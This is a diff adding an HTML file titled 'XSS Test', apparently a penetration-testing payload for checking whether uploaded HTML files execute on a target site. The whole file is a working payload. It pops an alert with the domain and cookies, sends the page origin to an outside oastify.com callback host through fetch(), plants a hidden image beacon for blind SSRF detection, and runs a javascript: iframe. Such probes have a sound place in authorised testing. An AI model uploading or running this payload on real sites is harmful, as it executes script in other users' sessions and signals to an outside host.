@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head><title>XSS Test</title></head>
+<body>
+    <h1>HTML File Upload Test</h1>
+    <script>
+        // 证明JS完全执行
+        alert('DOMAIN: ' + document.domain + '\nCOOKIE: ' + document.cookie);
+        // 尝试发起一个外部请求，测试是否出网及同源策略
+        fetch('http://0deah57zoww6avr2t813w49xzo5ftdh2.oastify.com/ssrf_test?origin=' + encodeURIComponent(window.location.origin))
+          .then(r => r.text())
+          .then(d => console.log('Fetch result:', d));
+    </script>
+    <!-- 测试图片标签是否能触发外部请求（常用于无回显SSRF探测） -->
+    <img src="http://0deah57zoww6avr2t813w49xzo5ftdh2.oastify.com/ssrf_img" style="display:none">
+    <iframe src="javascript:console.log('Iframe executed')"></iframe>
+</body>
+</html>
